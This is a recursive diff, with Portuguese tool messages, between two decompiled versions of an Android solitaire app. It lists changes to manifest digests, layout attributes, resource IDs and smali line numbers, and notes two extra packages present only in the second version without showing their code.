+> SHA1-Digest: PfKGVL0BIl0j74Mw9fEZVOpI3SQ=
+557c584
+< SHA1-Digest: 0WLfpysOZ3I5tRXiQmne3C0CFII=
+---
+> SHA1-Digest: Iv/ZyJU5JiS1is8UQFARgGOYk18=
+563c590
+< SHA1-Digest: BNEfe8rjJ5wFM9HarCl3fIoivvk=
+---
+> SHA1-Digest: ZHw29ND7DH3aXwU+7T5dRPaD090=
+575c602
+< SHA1-Digest: b4O+GmSKEzPMwI8aa6oARsYoDu8=
+---
+> SHA1-Digest: yJURQLBjoFFrZ0Vs2XF24G+yK34=
+581c608
+< SHA1-Digest: /e+JNxzHgat9GquSrRLV2wGpGcM=
+---
+> SHA1-Digest: zMaxLldb2rmm1IjulZwZSPY+yog=
+584c611
+< SHA1-Digest: b+Gcg1pvABnirSeiWVweRcqMBrE=
+---
+> SHA1-Digest: IrxYDe3bqlJDcO/QMpfekI/jiWM=
+599c626,629
+< SHA1-Digest: lQyICK+SZbODLw9tiyDpNmY0dJ8=
+---
+> SHA1-Digest: DGqzrDZl6MuDju7RdHbPng2E85o=
+> 
+> Name: assets/tosleng/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+602c632
+< SHA1-Digest: 6MYjPlNyJjOJ7XIb3umrmHDs3no=
+---
+> SHA1-Digest: JSIXwXWXhD5PJyod1yvCWI2BELA=
+611c641
+< SHA1-Digest: EpIjMGunWMdx6jWw4Y4WCUlOZX8=
+---
+> SHA1-Digest: c+vi/z5FIH/johjcoNzxgzahdVA=
+614c644
+< SHA1-Digest: GgYBmmC+7/tZO4jtJFVGLjumvwY=
+---
+> SHA1-Digest: SMwluC4YE46hjXSWcRWMx8BgVXg=
+618a649,651
+> Name: assets/tosleng/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+626c659
+< SHA1-Digest: PUwRBE6eQ7FO8xe3h+fNBBuJ/xY=
+---
+> SHA1-Digest: aR4Rurrzucy3EggwfyG2yqc/Lx4=
+629c662
+< SHA1-Digest: ehfRWKqUk99v+AgRj2DhZPgIz44=
+---
+> SHA1-Digest: 5k8Hy3YIyPmwidjS29g4+t4wLkY=
+634,635c667,668
+< Name: res/drawable-land-nodpi/bg3.jpg
+< SHA1-Digest: +iDARvHL42be8wxhTrxqlYB+1Xg=
+---
+> Name: res/raw/sound_deal.ogg
+> SHA1-Digest: ifalzBe/OwmgOGflf9zir6QlM/Y=
+638c671
+< SHA1-Digest: m1Cc/W0RedhOrg/Q+h2ecfNqU5c=
+---
+> SHA1-Digest: Dvba6+cbyMG66A4UUNfjUcMwRv4=
+640,641c673,677
+< Name: res/raw/sound_deal.ogg
+< SHA1-Digest: ifalzBe/OwmgOGflf9zir6QlM/Y=
+---
+> Name: res/drawable-land-nodpi/bg3.jpg
+> SHA1-Digest: +iDARvHL42be8wxhTrxqlYB+1Xg=
+> 
+> Name: res/layout/dm_feature_bar.xml
+> SHA1-Digest: TEsbJ4ZiwXjSV4QJKmw1+i+NX5s=
+646,648d681
+< Name: res/layout/dm_feature_bar.xml
+< SHA1-Digest: rZ63hzDLLIxrrH7aSIx8Kp8VK7Q=
+< 
+660a694,696
+> Name: res/drawable/dm_back.xml
+> SHA1-Digest: rSqL0byXaeMowxNuJr15f/vw96I=
+> 
+664,666d699
+< Name: res/drawable/dm_back.xml
+< SHA1-Digest: jfTapFsXibn/7tDhD6NRgaxN6UA=
+< 
+671c704,707
+< SHA1-Digest: 6+jVmL9h77C8pWpXmH9Pn4KCEek=
+---
+> SHA1-Digest: 2WhrqLGx/3osZ1BeNMSNjDpc28M=
+> 
+> Name: res/raw/sound_drop_failed.ogg
+> SHA1-Digest: rDKSC9Wm0frMXzAd73rB3FlBKJI=
+674c710
+< SHA1-Digest: yleNeE5kgdqLIS/TfTwWkgQqgz4=
+---
+> SHA1-Digest: xfPeD4sdMKMfN7T7Gk1Q1LxePO0=
+677,680c713
+< SHA1-Digest: EpIjMGunWMdx6jWw4Y4WCUlOZX8=
+< 
+< Name: res/raw/sound_drop_failed.ogg
+< SHA1-Digest: rDKSC9Wm0frMXzAd73rB3FlBKJI=
+---
+> SHA1-Digest: c+vi/z5FIH/johjcoNzxgzahdVA=
+698c731
+< SHA1-Digest: 4nprP0JLxCJW5jYyk5i3rvRgIlY=
+---
+> SHA1-Digest: w0dd5iVD9PahUITohWr4XHLHoo8=
+704c737
+< SHA1-Digest: F6fOvedDqss0Ba1U3qHNGeRs5hU=
+---
+> SHA1-Digest: E5nbM9C4YaLPyvKdoMLJkjwqCnU=
+716,719c749
+< SHA1-Digest: XZQA5R3cptiVZ8xKTj/OF4ec0/I=
+< 
+< Name: res/drawable-nodpi/font_8.png
+< SHA1-Digest: xtD1soNwU2aj+amRJqrHrTqmYU8=
+---
+> SHA1-Digest: Gk0VM0+uhZik8Xwte1xK/T8vctY=
+723a754,756
+> Name: res/drawable-nodpi/font_8.png
+> SHA1-Digest: xtD1soNwU2aj+amRJqrHrTqmYU8=
+> 
+726a760,762
+> Name: assets/tosleng/confirm_btn.png
+> SHA1-Digest: YuSe5o0DswmLLQmJLeyoTs7alDY=
+> 
+751,753d786
+< Name: res/drawable-nodpi/font_9.png
+< SHA1-Digest: mdIKiOSXRzsy1MZZ67rpaOYeqNg=
+< 
+756a790,792
+> Name: res/drawable-nodpi/font_9.png
+> SHA1-Digest: mdIKiOSXRzsy1MZZ67rpaOYeqNg=
+> 
+758c794
+< SHA1-Digest: oE4EFDch9Dbv/F5pC4d7Zr7uCwc=
+---
+> SHA1-Digest: oRayqMHKDkm/uJK/GaP5HCRvHS4=
+767c803
+< SHA1-Digest: vqZXQ+NuNYE/5H2jlacap9rjuKw=
+---
+> SHA1-Digest: jNNITuUR2G2hQ05XCRLzCCDhmpY=
+784,786d819
+< Name: res/drawable-nodpi/font_game.png
+< SHA1-Digest: 9AJ/iXKQZzNmqhN+R4kpay5awc0=
+< 
+790,791c823,824
+< Name: res/drawable-nodpi/card_img_spades_j.png
+< SHA1-Digest: HxUm8rTOox1THUP21tHnuZ4GRN8=
+---
+> Name: res/drawable-nodpi/font_game.png
+> SHA1-Digest: 9AJ/iXKQZzNmqhN+R4kpay5awc0=
+794a828,830
+> 
+> Name: res/drawable-nodpi/card_img_spades_j.png
+> SHA1-Digest: HxUm8rTOox1THUP21tHnuZ4GRN8=
+Somente em result/APP_29/App_M_29/original/META-INF: RANGFEI.RSA
+Somente em result/APP_29/App_M_29/original/META-INF: RANGFEI.SF
+Os arquivos binários result/APP_29/App_B_29/res/drawable/dm_frame1.9.png e result/APP_29/App_M_29/res/drawable/dm_frame1.9.png são diferentes
+Os arquivos binários result/APP_29/App_B_29/res/drawable/dm_tab_selected_bar_left.9.png e result/APP_29/App_M_29/res/drawable/dm_tab_selected_bar_left.9.png são diferentes
+Os arquivos binários result/APP_29/App_B_29/res/drawable/dm_tab_selected_bar_right.9.png e result/APP_29/App_M_29/res/drawable/dm_tab_selected_bar_right.9.png são diferentes
+Os arquivos binários result/APP_29/App_B_29/res/drawable/dm_tab_selected_bar_v4.9.png e result/APP_29/App_M_29/res/drawable/dm_tab_selected_bar_v4.9.png são diferentes
+Os arquivos binários result/APP_29/App_B_29/res/drawable/dm_top_normal.9.png e result/APP_29/App_M_29/res/drawable/dm_top_normal.9.png são diferentes
+diff -r result/APP_29/App_B_29/res/layout/dm_friends_view.xml result/APP_29/App_M_29/res/layout/dm_friends_view.xml
+7c7
+<     <ListView android:id="@id/moregame_list" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/allgame_bar" />
+---
+>     <ListView android:id="@id/moregame_list" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/allgame_bar" />
+diff -r result/APP_29/App_B_29/res/layout/dm_leaderboards_view.xml result/APP_29/App_M_29/res/layout/dm_leaderboards_view.xml
+18,19c18,19
+<                     <ListView android:id="@id/leaderboard_top" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" />
+<                     <ListView android:id="@id/leaderboard_me" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" />
+---
+>                     <ListView android:id="@id/leaderboard_top" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" />
+>                     <ListView android:id="@id/leaderboard_me" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" />
+diff -r result/APP_29/App_B_29/res/layout/dm_moregames_activity.xml result/APP_29/App_M_29/res/layout/dm_moregames_activity.xml
+15c15
+<     <ListView android:id="@id/moregame_list" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/allgame_bar" />
+---
+>     <ListView android:id="@id/moregame_list" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/allgame_bar" />
+diff -r result/APP_29/App_B_29/res/layout/dm_userinfo_view_listview.xml result/APP_29/App_M_29/res/layout/dm_userinfo_view_listview.xml
+2c2
+< <ListView android:id="@id/userinfo_list" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px"
+---
+> <ListView android:id="@id/userinfo_list" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px"
+diff -r result/APP_29/App_B_29/res/layout/dm_userinfo_view.xml result/APP_29/App_M_29/res/layout/dm_userinfo_view.xml
+21c21
+<     <ListView android:id="@id/userinfo_list" android:fadingEdge="@null" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/home_bar" />
+---
+>     <ListView android:id="@id/userinfo_list" android:fadingEdge="none" android:layout_width="fill_parent" android:layout_height="fill_parent" android:cacheColorHint="#00000000" android:divider="@drawable/dm_divider" android:dividerHeight="1.0px" android:layout_below="@id/home_bar" />
+diff -r result/APP_29/App_B_29/res/values/public.xml result/APP_29/App_M_29/res/values/public.xml
+378,442c378,440
+<     <public type="string" name="new_game_draw_1" id="0x7f0a0065" />
+<     <public type="string" name="new_game_draw_3" id="0x7f0a0066" />
+<     <public type="string" name="select_game" id="0x7f0a0067" />
+<     <public type="string" name="restart" id="0x7f0a0068" />
+<     <public type="string" name="main_menu" id="0x7f0a0069" />
+<     <public type="string" name="statistics" id="0x7f0a006a" />
+<     <public type="string" name="settings" id="0x7f0a006b" />
+<     <public type="string" name="exit" id="0x7f0a006c" />
+<     <public type="string" name="preference_background_title" id="0x7f0a006d" />
+<     <public type="string" name="preference_background_summary" id="0x7f0a006e" />
+<     <public type="string" name="preference_card_back_title" id="0x7f0a006f" />
+<     <public type="string" name="preference_card_back_summary" id="0x7f0a0070" />
+<     <public type="string" name="preference_orientation_title" id="0x7f0a0071" />
+<     <public type="string" name="preference_orientation_summary" id="0x7f0a0072" />
+<     <public type="string" name="preference_sound_title" id="0x7f0a0073" />
+<     <public type="string" name="preference_sound_summary" id="0x7f0a0074" />
+<     <public type="string" name="preference_back_button_undo_title" id="0x7f0a0075" />
+<     <public type="string" name="preference_back_button_undo_summary" id="0x7f0a0076" />
+<     <public type="string" name="preference_draw_three_title" id="0x7f0a0077" />
+<     <public type="string" name="preference_draw_three_summary" id="0x7f0a0078" />
+<     <public type="string" name="preference_vegas_mode_title" id="0x7f0a0079" />
+<     <public type="string" name="preference_vegas_mode_summary" id="0x7f0a007a" />
+<     <public type="string" name="preference_vegas_cumulative_title" id="0x7f0a007b" />
+<     <public type="string" name="preference_vegas_cumulative_summary" id="0x7f0a007c" />
+<     <public type="string" name="preference_spider_suits_title" id="0x7f0a007d" />
+<     <public type="string" name="preference_spider_suits_summary" id="0x7f0a007e" />
+<     <public type="string" name="preference_spider_restricted_deal_title" id="0x7f0a007f" />
+<     <public type="string" name="preference_spider_restricted_deal_summary" id="0x7f0a0080" />
+<     <public type="string" name="color_green" id="0x7f0a0081" />
+<     <public type="string" name="color_orange" id="0x7f0a0082" />
+<     <public type="string" name="color_blue" id="0x7f0a0083" />
+<     <public type="string" name="color_red" id="0x7f0a0084" />
+<     <public type="string" name="bg1_name" id="0x7f0a0085" />
+<     <public type="string" name="bg2_name" id="0x7f0a0086" />
+<     <public type="string" name="bg3_name" id="0x7f0a0087" />
+<     <public type="string" name="bg4_name" id="0x7f0a0088" />
+<     <public type="string" name="card_badk1_name" id="0x7f0a0089" />
+<     <public type="string" name="card_badk2_name" id="0x7f0a008a" />
+<     <public type="string" name="card_badk3_name" id="0x7f0a008b" />
+<     <public type="string" name="card_badk4_name" id="0x7f0a008c" />
+<     <public type="string" name="orientation_auto" id="0x7f0a008d" />
+<     <public type="string" name="orientation_portrait" id="0x7f0a008e" />
+<     <public type="string" name="orientation_landsacpe" id="0x7f0a008f" />
+<     <public type="string" name="stat_draw_1" id="0x7f0a0090" />
+<     <public type="string" name="stat_draw_3" id="0x7f0a0091" />
+<     <public type="string" name="stat_vegas" id="0x7f0a0092" />
+<     <public type="string" name="stat_freecell" id="0x7f0a0093" />
+<     <public type="string" name="stat_spider_1_suit" id="0x7f0a0094" />
+<     <public type="string" name="stat_spider_2_suits" id="0x7f0a0095" />
+<     <public type="string" name="stat_spider_3_suits" id="0x7f0a0096" />
+<     <public type="string" name="stat_spider_4_suits" id="0x7f0a0097" />
+<     <public type="string" name="stat_high_score" id="0x7f0a0098" />
+<     <public type="string" name="stat_games_played" id="0x7f0a0099" />
+<     <public type="string" name="stat_games_won" id="0x7f0a009a" />
+<     <public type="string" name="stat_win_percentage" id="0x7f0a009b" />
+<     <public type="string" name="stat_shortest_winning_time" id="0x7f0a009c" />
+<     <public type="string" name="stat_average_winning_time" id="0x7f0a009d" />
+<     <public type="string" name="stat_fewest_winning_moves" id="0x7f0a009e" />
+<     <public type="string" name="stat_average_winning_moves" id="0x7f0a009f" />
+<     <public type="string" name="stat_longest_winning_streak" id="0x7f0a00a0" />
+<     <public type="string" name="stat_longest_losing_streak" id="0x7f0a00a1" />
+<     <public type="string" name="stat_current_streak" id="0x7f0a00a2" />
+<     <public type="string" name="stat_most_money_won" id="0x7f0a00a3" />
+<     <public type="string" name="stat_most_money_lost" id="0x7f0a00a4" />
+<     <public type="string" name="stat_current_money" id="0x7f0a00a5" />
+---
+>     <public type="string" name="select_game" id="0x7f0a0065" />
+>     <public type="string" name="restart" id="0x7f0a0066" />
+>     <public type="string" name="main_menu" id="0x7f0a0067" />
+>     <public type="string" name="statistics" id="0x7f0a0068" />
+>     <public type="string" name="settings" id="0x7f0a0069" />
+>     <public type="string" name="exit" id="0x7f0a006a" />
+>     <public type="string" name="preference_background_title" id="0x7f0a006b" />
+>     <public type="string" name="preference_background_summary" id="0x7f0a006c" />
+>     <public type="string" name="preference_card_back_title" id="0x7f0a006d" />
+>     <public type="string" name="preference_card_back_summary" id="0x7f0a006e" />
+>     <public type="string" name="preference_orientation_title" id="0x7f0a006f" />
+>     <public type="string" name="preference_orientation_summary" id="0x7f0a0070" />
+>     <public type="string" name="preference_sound_title" id="0x7f0a0071" />
+>     <public type="string" name="preference_sound_summary" id="0x7f0a0072" />
+>     <public type="string" name="preference_back_button_undo_title" id="0x7f0a0073" />
+>     <public type="string" name="preference_back_button_undo_summary" id="0x7f0a0074" />
+>     <public type="string" name="preference_draw_three_title" id="0x7f0a0075" />
+>     <public type="string" name="preference_draw_three_summary" id="0x7f0a0076" />
+>     <public type="string" name="preference_vegas_mode_title" id="0x7f0a0077" />
+>     <public type="string" name="preference_vegas_mode_summary" id="0x7f0a0078" />
+>     <public type="string" name="preference_vegas_cumulative_title" id="0x7f0a0079" />
+>     <public type="string" name="preference_vegas_cumulative_summary" id="0x7f0a007a" />
+>     <public type="string" name="preference_spider_suits_title" id="0x7f0a007b" />
+>     <public type="string" name="preference_spider_suits_summary" id="0x7f0a007c" />
+>     <public type="string" name="preference_spider_restricted_deal_title" id="0x7f0a007d" />
+>     <public type="string" name="preference_spider_restricted_deal_summary" id="0x7f0a007e" />
+>     <public type="string" name="color_green" id="0x7f0a007f" />
+>     <public type="string" name="color_orange" id="0x7f0a0080" />
+>     <public type="string" name="color_blue" id="0x7f0a0081" />
+>     <public type="string" name="color_red" id="0x7f0a0082" />
+>     <public type="string" name="bg1_name" id="0x7f0a0083" />
+>     <public type="string" name="bg2_name" id="0x7f0a0084" />
+>     <public type="string" name="bg3_name" id="0x7f0a0085" />
+>     <public type="string" name="bg4_name" id="0x7f0a0086" />
+>     <public type="string" name="card_badk1_name" id="0x7f0a0087" />
+>     <public type="string" name="card_badk2_name" id="0x7f0a0088" />
+>     <public type="string" name="card_badk3_name" id="0x7f0a0089" />
+>     <public type="string" name="card_badk4_name" id="0x7f0a008a" />
+>     <public type="string" name="orientation_auto" id="0x7f0a008b" />
+>     <public type="string" name="orientation_portrait" id="0x7f0a008c" />
+>     <public type="string" name="orientation_landsacpe" id="0x7f0a008d" />
+>     <public type="string" name="stat_draw_1" id="0x7f0a008e" />
+>     <public type="string" name="stat_draw_3" id="0x7f0a008f" />
+>     <public type="string" name="stat_vegas" id="0x7f0a0090" />
+>     <public type="string" name="stat_freecell" id="0x7f0a0091" />
+>     <public type="string" name="stat_spider_1_suit" id="0x7f0a0092" />
+>     <public type="string" name="stat_spider_2_suits" id="0x7f0a0093" />
+>     <public type="string" name="stat_spider_3_suits" id="0x7f0a0094" />
+>     <public type="string" name="stat_spider_4_suits" id="0x7f0a0095" />
+>     <public type="string" name="stat_high_score" id="0x7f0a0096" />
+>     <public type="string" name="stat_games_played" id="0x7f0a0097" />
+>     <public type="string" name="stat_games_won" id="0x7f0a0098" />
+>     <public type="string" name="stat_win_percentage" id="0x7f0a0099" />
+>     <public type="string" name="stat_shortest_winning_time" id="0x7f0a009a" />
+>     <public type="string" name="stat_average_winning_time" id="0x7f0a009b" />
+>     <public type="string" name="stat_fewest_winning_moves" id="0x7f0a009c" />
+>     <public type="string" name="stat_average_winning_moves" id="0x7f0a009d" />
+>     <public type="string" name="stat_longest_winning_streak" id="0x7f0a009e" />
+>     <public type="string" name="stat_longest_losing_streak" id="0x7f0a009f" />
+>     <public type="string" name="stat_current_streak" id="0x7f0a00a0" />
+>     <public type="string" name="stat_most_money_won" id="0x7f0a00a1" />
+>     <public type="string" name="stat_most_money_lost" id="0x7f0a00a2" />
+>     <public type="string" name="stat_current_money" id="0x7f0a00a3" />
+diff -r result/APP_29/App_B_29/res/values/strings.xml result/APP_29/App_M_29/res/values/strings.xml
+124,125d123
+<     <string name="new_game_draw_1">New Game - Draw 1</string>
+<     <string name="new_game_draw_3">New Game - Draw 3</string>
+Somente em result/APP_29/App_M_29/smali/com: geseng
+Somente em result/APP_29/App_M_29/smali/com: slegl
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game/FreecellGame.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/game/FreecellGame.smali
+1991c1991
+<     const v2, 0x7f0a0068
+---
+>     const v2, 0x7f0a0066
+2007c2007
+<     const v2, 0x7f0a0067
+---
+>     const v2, 0x7f0a0065
+2015c2015
+<     const v2, 0x7f0a006a
+---
+>     const v2, 0x7f0a0068
+2023c2023
+<     const v2, 0x7f0a0069
+---
+>     const v2, 0x7f0a0067
+2088c2088
+<     const v2, 0x7f0a0068
+---
+>     const v2, 0x7f0a0066
+2104c2104
+<     const v2, 0x7f0a0067
+---
+>     const v2, 0x7f0a0065
+2112c2112
+<     const v2, 0x7f0a006a
+---
+>     const v2, 0x7f0a0068
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game/Game$WinDialog.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/game/Game$WinDialog.smali
+70c70
+<     const v1, 0x7f0a0068
+---
+>     const v1, 0x7f0a0066
+81c81
+<     const v1, 0x7f0a0069
+---
+>     const v1, 0x7f0a0067
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game/Game.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/game/Game.smali
+3629c3629
+<     const v2, 0x7f0a0068
+---
+>     const v2, 0x7f0a0066
+3643c3643
+<     const v2, 0x7f0a006a
+---
+>     const v2, 0x7f0a0068
+3651c3651
+<     const v2, 0x7f0a0069
+---
+>     const v2, 0x7f0a0067
+3716c3716
+<     const v2, 0x7f0a0068
+---
+>     const v2, 0x7f0a0066
+3730c3730
+<     const v2, 0x7f0a006a
+---
+>     const v2, 0x7f0a0068
+Somente em result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game: SolitaireGame$1.smali
+Somente em result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game: SolitaireGame$2.smali
+Somente em result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game: SolitaireGame$3.smali
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/game/SolitaireGame.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/game/SolitaireGame.smali
+35c35
+<     .line 38
+---
+>     .line 33
+38c38
+<     .line 39
+---
+>     .line 34
+48c48
+<     .line 40
+---
+>     .line 35
+53c53
+<     .line 41
+---
+>     .line 36
+56c56
+<     .line 39
+---
+>     .line 34
+70c70
+<     .line 95
+---
+>     .line 90
+73c73
+<     .line 96
+---
+>     .line 91
+76c76
+<     .line 101
+---
+>     .line 96
+80c80
+<     .line 102
+---
+>     .line 97
+83c83
+<     .line 105
+---
+>     .line 100
+86c86
+<     .line 98
+---
+>     .line 93
+98c98
+<     .line 475
+---
+>     .line 406
+119c119
+<     .line 467
+---
+>     .line 398
+144c144
+<     .line 463
+---
+>     .line 394
+167c167
+<     .line 471
+---
+>     .line 402
+195c195
+<     .line 191
+---
+>     .line 186
+202c202
+<     .line 227
+---
+>     .line 222
+206c206
+<     .line 194
+---
+>     .line 189
+210c210
+<     .line 195
+---
+>     .line 190
+215c215
+<     .line 199
+---
+>     .line 194
+219c219
+<     .line 200
+---
+>     .line 195
+223c223
+<     .line 202
+---
+>     .line 197
+231c231
+<     .line 203
+---
+>     .line 198
+236c236
+<     .line 204
+---
+>     .line 199
+244c244
+<     .line 205
+---
+>     .line 200
+249c249
+<     .line 206
+---
+>     .line 201
+259c259
+<     .line 207
+---
+>     .line 202
+264c264
+<     .line 208
+---
+>     .line 203
+272c272
+<     .line 209
+---
+>     .line 204
+275c275
+<     .line 210
+---
+>     .line 205
+278c278
+<     .line 212
+---
+>     .line 207
+286c286
+<     .line 219
+---
+>     .line 214
+296c296
+<     .line 220
+---
+>     .line 215
+299c299
+<     .line 202
+---
+>     .line 197
+312c312
+<     .line 213
+---
+>     .line 208
+319c319
+<     .line 214
+---
+>     .line 209
+327c327
+<     .line 206
+---
+>     .line 201
+334c334
+<     .line 202
+---
+>     .line 197
+350c350
+<     .line 224
+---
+>     .line 219
+357c357
+<     .line 225
+---
+>     .line 220
+363c363
+<     .line 226
+---
+>     .line 221
+375c375
+<     .line 155
+---
+>     .line 150
+380c380
+<     .line 156
+---
+>     .line 151
+384c384
+<     .line 158
+---
+>     .line 153
+396c396
+<     .line 159
+---
+>     .line 154
+405c405
+<     .line 160
+---
+>     .line 155
+410c410
+<     .line 161
+---
+>     .line 156
+418c418
+<     .line 162
+---
+>     .line 157
+421c421
+<     .line 167
+---
+>     .line 162
+427c427
+<     .line 169
+---
+>     .line 164
+430c430
+<     .line 170
+---
+>     .line 165
+440c440
+<     .line 171
+---
+>     .line 166
+445c445
+<     .line 172
+---
+>     .line 167
+455c455
+<     .line 173
+---
+>     .line 168
+460c460
+<     .line 174
+---
+>     .line 169
+464c464
+<     .line 175
+---
+>     .line 170
+467c467
+<     .line 176
+---
+>     .line 171
+470c470
+<     .line 170
+---
+>     .line 165
+477c477
+<     .line 159
+---
+>     .line 154
+484c484
+<     .line 181
+---
+>     .line 176
+490c490
+<     .line 183
+---
+>     .line 178
+493c493
+<     .line 184
+---
+>     .line 179
+496c496
+<     .line 186
+---
+>     .line 181
+514c514
+<     .line 119
+---
+>     .line 114
+539c539
+<     .line 128
+---
+>     .line 123
+544c544
+<     .line 123
+---
+>     .line 118
+554c554
+<     .line 124
+---
+>     .line 119
+573c573
+<     .line 123
+---
+>     .line 118
+581c581
+<     .line 128
+---
+>     .line 123
+589c589
+<     .line 133
+---
+>     .line 128
+598c598
+<     .line 134
+---
+>     .line 129
+611c611
+<     .line 135
+---
+>     .line 130
+614c614
+<     .line 138
+---
+>     .line 133
+618c618
+<     .line 133
+---
+>     .line 128
+624c624
+<     .line 138
+---
+>     .line 133
+635c635
+<     .line 60
+---
+>     .line 55
+647c647
+<     .line 61
+---
+>     .line 56
+650c650
+<     .line 60
+---
+>     .line 55
+669c669
+<     .line 47
+---
+>     .line 42
+676c676
+<     .line 48
+---
+>     .line 43
+685c685
+<     .line 49
+---
+>     .line 44
+696c696
+<     .line 48
+---
+>     .line 43
+701c701
+<     .line 51
+---
+>     .line 46
+710c710
+<     .line 52
+---
+>     .line 47
+721c721
+<     .line 51
+---
+>     .line 46
+726c726
+<     .line 54
+---
+>     .line 49
+738c738
+<     .line 55
+---
+>     .line 50
+749c749
+<     .line 56
+---
+>     .line 51
+759c759
+<     .line 74
+---
+>     .line 69
+766c766
+<     .line 75
+---
+>     .line 70
+776c776
+<     .line 76
+---
+>     .line 71
+785c785
+<     .line 77
+---
+>     .line 72
+805c805
+<     .line 76
+---
+>     .line 71
+813c813
+<     .line 77
+---
+>     .line 72
+816c816
+<     .line 75
+---
+>     .line 70
+822c822
+<     .line 85
+---
+>     .line 80
+831c831
+<     .line 86
+---
+>     .line 81
+840c840
+<     .line 87
+---
+>     .line 82
+851c851
+<     .line 92
+---
+>     .line 87
+860c860
+<     .line 248
+---
+>     .line 243
+865c865
+<     .line 251
+---
+>     .line 246
+875c875
+<     .line 252
+---
+>     .line 247
+880c880
+<     .line 253
+---
+>     .line 248
+888c888
+<     .line 254
+---
+>     .line 249
+895c895
+<     .line 255
+---
+>     .line 250
+905c905
+<     .line 256
+---
+>     .line 251
+916c916
+<     .line 257
+---
+>     .line 252
+925c925
+<     .line 251
+---
+>     .line 246
+938c938
+<     .line 255
+---
+>     .line 250
+946c946
+<     .line 251
+---
+>     .line 246
+963c963
+<     .line 264
+---
+>     .line 259
+970c970
+<     .line 267
+---
+>     .line 262
+979c979
+<     .line 268
+---
+>     .line 263
+984c984
+<     .line 269
+---
+>     .line 264
+990c990
+<     .line 270
+---
+>     .line 265
+998c998
+<     .line 271
+---
+>     .line 266
+1003c1003
+<     .line 272
+---
+>     .line 267
+1021c1021
+<     .line 273
+---
+>     .line 268
+1032c1032
+<     .line 270
+---
+>     .line 265
+1038c1038
+<     .line 272
+---
+>     .line 267
+1045c1045
+<     .line 276
+---
+>     .line 271
+1056c1056
+<     .line 277
+---
+>     .line 272
+1069c1069
+<     .line 278
+---
+>     .line 273
+1074c1074
+<     .line 279
+---
+>     .line 274
+1078c1078
+<     .line 280
+---
+>     .line 275
+1081c1081
+<     .line 284
+---
+>     .line 279
+1085c1085
+<     .line 276
+---
+>     .line 271
+1092c1092
+<     .line 282
+---
+>     .line 277
+1099c1099
+<     .line 267
+---
+>     .line 262
+1109c1109
+<     .line 293
+---
+>     .line 288
+1121c1121
+<     .line 294
+---
+>     .line 289
+1126c1126
+<     .line 295
+---
+>     .line 290
+1140c1140
+<     .line 293
+---
+>     .line 288
+1151c1151
+<     .line 298
+---
+>     .line 293
+1159c1159
+<     .line 299
+---
+>     .line 294
+1166c1166
+<     .line 300
+---
+>     .line 295
+1184c1184
+<     .line 301
+---
+>     .line 296
+1195c1195
+<     .line 302
+---
+>     .line 297
+1206c1206
+<     .line 303
+---
+>     .line 298
+1213c1213
+<     .line 304
+---
+>     .line 299
+1219c1219
+<     .line 305
+---
+>     .line 300
+1222c1222
+<     .line 309
+---
+>     .line 304
+1226c1226
+<     .line 301
+---
+>     .line 296
+1233c1233
+<     .line 300
+---
+>     .line 295
+1241c1241
+<     .line 307
+---
+>     .line 302
+1250c1250
+<     .line 293
+---
+>     .line 288
+1269c1269
+<     .line 317
+---
+>     .line 312
+1274c1274
+<     .line 319
+---
+>     .line 314
+1285c1285
+<     .line 320
+---
+>     .line 315
+1293c1293
+<     .line 328
+---
+>     .line 323
+1300c1300
+<     .line 329
+---
+>     .line 324
+1308c1308
+<     .line 330
+---
+>     .line 325
+1316c1316
+<     .line 331
+---
+>     .line 326
+1325c1325
+<     .line 332
+---
+>     .line 327
+1332c1332
+<     .line 338
+---
+>     .line 333
+1337c1337
+<     .line 333
+---
+>     .line 328
+1351c1351
+<     .line 334
+---
+>     .line 329
+1358c1358
+<     .line 335
+---
+>     .line 330
+1369c1369
+<     .line 336
+---
+>     .line 331
+1383c1383
+<     .line 147
+---
+>     .line 142
+1445c1445
+<     .line 366
+---
+>     .line 361
+1448c1448
+<     if-eqz v1, :cond_2
+---
+>     if-eqz v1, :cond_1
+1450c1450
